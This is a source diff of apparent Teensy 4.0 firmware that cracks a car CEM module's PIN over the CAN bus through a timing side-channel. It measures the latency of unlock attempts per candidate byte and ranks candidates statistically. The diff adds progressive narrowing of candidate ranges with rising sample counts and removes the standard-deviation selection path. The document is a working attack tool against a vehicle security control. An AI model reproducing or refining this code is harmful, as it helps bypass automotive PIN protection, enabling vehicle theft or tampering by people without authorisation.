@@ -10,10 +10,8 @@
 
 /* tunable parameters */
 
-#define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
 #define CALC_BYTES     3     /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
-#define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
-#define LAT_ONLY             /* choose candidates by latency only (vs latency/standard deviation) */
+//#define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
 //#define  DUMP_BUCKETS                               /* dump all buckets for debugging */
 
 /* end of tunable parameters */
@@ -25,9 +23,9 @@
 #error Unsupported Teensy model, need 4.0
 #endif
 
-uint32_t cem_reply_min;
-uint32_t cem_reply_avg;
-uint32_t cem_reply_max;
+int cem_reply_min;
+int cem_reply_avg;
+int cem_reply_max;
 
 #define AVERAGE_DELTA_MIN     -8  /* buckets to look at before the rolling average */
 #define AVERAGE_DELTA_MAX     12  /* buckets to look at after the rolling average  */
@@ -546,14 +544,6 @@ int seq_max_lat(const void *a, const void *b)
   return _b->latency - _a->latency;
 }
 
-int seq_max_std(const void *a, const void *b)
-{
-  sequence_t *_a = (sequence_t *)a;
-  sequence_t *_b = (sequence_t *)b;
-
-  return (int)(100 * _b->std) - (int)(100 *_a->std);
-}
-
 /*******************************************************************************
  *
  * crackPinPosition - attempt to find a specific digit in the PIN 
@@ -561,24 +551,48 @@ int seq_max_std(const void *a, const void *b)
  * Returns: N/A
  */
 
-void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
+
+void crackPinPosition(uint8_t *pin, uint32_t pos, bool verbose)
 {
-  int len = sizeof(uint32_t) * (cem_reply_max - cem_reply_min);
+  uint8_t seq[100];
+  int i;
+  int ranges[7]  = { 100, 50, 25,  12,   6,   3,   2 };
+  int samples[7] = { 10,  20, 50, 100, 200, 300, 400 };
+
+  for (i = 0; i < 100; i++) {
+    seq[i] = binToBcd(i);
+  }
+
+  for (i = 0; i < 7; i++) {
+    crack_range(pin, pos, seq, ranges[i], samples[i], verbose);
+  }
+}
+
+void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bool verbose)
+{
+  int len = sizeof(int) * (cem_reply_max - cem_reply_min);
   uint32_t *histogram = (uint32_t *)malloc(len);
   uint32_t latency;
   uint32_t prod;
   uint32_t sum;
   double std;
-  uint8_t  pin1, pin2;
-  uint32_t i;
-  uint32_t k;
-  uint32_t xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
-  uint32_t xmax = cem_reply_avg + AVERAGE_DELTA_MAX;
+  int pin1, pin2;
+  int i;
+  int k;
+  int xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
+  int xmax = cem_reply_avg + AVERAGE_DELTA_MAX;
 
   /* clear collected latencies */
 
   memset (sequence, 0, sizeof(sequence));
 
+  printf("range %d, samples %d\n", range, samples);
+  printf("candidates short list: ");
+  for (i = 0; i < min(50, range); i++)
+    printf("%02x ", seq[i]);
+  if (50 < range)
+    printf(" (+ %d more)\n", range - 50);
+  printf("\n");
   printf("                   us: ");
   for (i = xmin; i < xmax; i++)
     printf("%5d ", i);
@@ -586,10 +600,11 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
   /* iterate over all possible values for the PIN digit */
 
-  for (pin1 = 0; pin1 < 100; pin1++) {
+  for (pin1 = 0; pin1 < range; pin1++) {
+
     /* set PIN digit */
 
-    pin[pos] = binToBcd (pin1);
+    pin[pos] = seq[pin1];
 
     /* print a progress message for each PIN digit we're processing */
 
@@ -597,7 +612,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* show numerial values for the known digits */
 
-    for (i=0; i <= pos; i++) {
+    for (i = 0; i <= pos; i++) {
       printf ("%02x ", pin[i]);
     }
 
@@ -624,11 +639,9 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
       /* collect latency measurements the PIN pair */
 
-      for (uint32_t j = 0; j < SAMPLES; j++) {
+      for (int j = 0; j < samples; j++) {
 
-        /* iterate the next PIN digit (third digit) */
-
-        pin[pos + 2] = binToBcd ((uint8_t)j);
+        pin[pos + 2] = range < 100 ? random(100, 255) : binToBcd(j % 100);
 
         /* try and unlock and measure the latency */
 
@@ -636,7 +649,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* calculate the index into the historgram */
 
-        uint32_t idx = latency / clockCyclesPerMicrosecond();
+        int idx = latency / clockCyclesPerMicrosecond();
 
         if (idx < cem_reply_min)
           idx = cem_reply_min;
@@ -653,9 +666,8 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* clear the digits we just used for latency iteration */
 
-    pin[pos + 1] = 0;
-    pin[pos + 2] = 0;
-    pin[pos + 3] = 0;
+    pin[pos + 1] = 0x00;
+    pin[pos + 2] = 0x00;
 
     /* clear statistical values we're calculating */
 
@@ -680,7 +692,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
     int mean = sum / (xmax - xmin);
     long x = 0;
 
-    for (unsigned int k = cem_reply_min; k < cem_reply_max; k++) {
+    for (k = cem_reply_min; k < cem_reply_max; k++) {
       int l = k - cem_reply_min;
       if (histogram[l])
         x += sq(histogram[l] - mean);
@@ -712,65 +724,23 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
   /* sort the collected sequence of latencies */
 
-  qsort (sequence, 100, sizeof(sequence_t), seq_max_lat);
+  qsort (sequence, range, sizeof(sequence_t), seq_max_lat);
 
-  /* print the top 25 latencies and their PIN value */
+  /* print the top range/2 latencies and their PIN value */
   printf("best candidates ordered by latency:\n");
-  for (uint32_t i = 0; i < 5; i++) {
+  for (int i = 0; i < range; i++) {
     printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
   }
   printf("...\n");
-  for (uint32_t i = 95; i < 100; i++) {
-    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
+
+  for (i = 0; i < range; i++)
+    seq[i] = sequence[i].pinValue;
+
+  if (range == 2) {
+    /* set the digit in the overall PIN */
+    pin[pos] = sequence[0].pinValue;
+    printf ("pin[%u] choose candidate: %02x\n", pos, pin[pos]);
   }
-  double lat_k_0_1   = 100.0 * (sequence[0].latency - sequence[1].latency) / sequence[1].latency;
-  double lat_k_98_99 = 100.0 * (sequence[98].latency - sequence[99].latency) / sequence[99].latency;
-  double lat_k_0_99  = 100.0 * (sequence[0].latency - sequence[99].latency) / sequence[99].latency;
-
-  /* set the digit in the overall PIN */
-
-  pin[pos] = sequence[0].pinValue;
-  pin[pos + 1] = 0;
-  pin[pos + 2] = 0;
-
-  qsort (sequence, 100, sizeof(sequence_t), seq_max_std);
-
-  /* print the top 25 latencies and their PIN value */
-
-  printf("\nbest candidates ordered by std:\n");
-  for (uint32_t i = 0; i < 5; i++) {
-    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
-  }
-  printf("...\n");
-  for (uint32_t i = 95; i < 100; i++) {
-    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
-  }
-  double std_k_0_1   = 100.0 * (sequence[0].std - sequence[1].std) / sequence[1].std;
-  double std_k_98_99 = 100.0 * (sequence[98].std - sequence[99].std) / sequence[99].std;
-  double std_k_0_99  = 100.0 * (sequence[0].std - sequence[99].std) / sequence[99].std;
-
-  printf("\nlat_k 0-1 %3.2f%%, lat_k 98-99 %3.2f%%, lat_k 0-99 %3.2f%%\n", lat_k_0_1, lat_k_98_99, lat_k_0_99);
-  printf("std_k 0-1 %3.2f%%, std_k 98-99 %3.2f%%, std_k 0-99 %3.2f%%\n", std_k_0_1, std_k_98_99, std_k_0_99);
-
-#ifdef LAT_ONLY
-    printf ("pin[%u] choose candidate: %02x (latency only)\n", pos, pin[pos]);
-#else
-  if (lat_k_0_99 > std_k_0_99) {
-    printf("Latency has more deviation than STD\n");
-    /* choose the PIN value that has the highest latency */
-    printf ("pin[%u] choose candidate: %02x based on latency\n", pos, pin[pos]);
-  } else {
-    printf("STD has more deviation than latency\n");
-    if (std_k_0_1 > std_k_98_99) {
-      printf("STD[0] deviates more than STD[99]\n");
-      pin[pos] = sequence[0].pinValue;
-    } else {
-      printf("STD[99] deviates more than STD[0]\n");
-      pin[pos] = sequence[99].pinValue;
-    }
-    printf ("pin[%u] choose candidate: %02x based on std\n", pos, pin[pos]);
-  }
-#endif
 
   free(histogram);
 }
@@ -782,7 +752,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
  * Returns: N/A
  */
 
-void cemCrackPin (uint32_t maxBytes, bool verbose)
+void cemCrackPin (int maxBytes, bool verbose)
 {
   uint8_t  pin[PIN_LEN];
   uint8_t  pinUsed[PIN_LEN];
@@ -793,7 +763,7 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
   uint32_t crackRate;
   uint32_t remainingBytes;
   bool     cracked = false;
-  uint32_t i;
+  int i;
 
   printf ("Calculating bytes 0-%u\n", maxBytes - 1);
 
@@ -807,11 +777,11 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
 
   /* set the PIN to all zeros */
 
-  memset (pin, 0, sizeof(pin));
+  memset (pin, 0x00, sizeof(pin));
 
   /* try and crack each PIN position */
 
-  for (uint32_t i = 0; i < maxBytes; i++) {
+  for (i = 0; i < maxBytes; i++) {
     crackPinPosition (pin, i, verbose);
   }
 
@@ -1028,13 +998,12 @@ void setup (void)
 
   pinMode (CAN_L_PIN, INPUT_PULLUP);
 
-//  set_arm_clock (180000000);
+  set_arm_clock (180000000);
 
   printf ("CPU Maximum Frequency:   %u\n", F_CPU);
   printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
   printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
   printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
-  printf ("Number of samples:       %u\n", SAMPLES);
 
   long pn = 0;
 
